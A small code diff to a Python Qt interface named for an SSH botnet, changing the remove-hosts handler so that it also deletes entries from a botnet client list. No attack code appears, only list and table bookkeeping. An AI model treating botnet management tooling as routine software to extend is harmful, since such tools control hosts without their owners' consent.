@@ -88,7 +88,9 @@ class Ui_SSHBotNetWindow(object):
     def removeHostsBtnClick(self):
         try:
             indices = sorted(self.hostsTable.selectionModel().selectedRows())
-            [self.hostsTable.removeRow(x.row()) for x in indices]
+            for x in indices:
+                del botNet_clients[x.row()]
+                self.hostsTable.removeRow(x.row())
         except Exception as ex:
             print(ex)
 
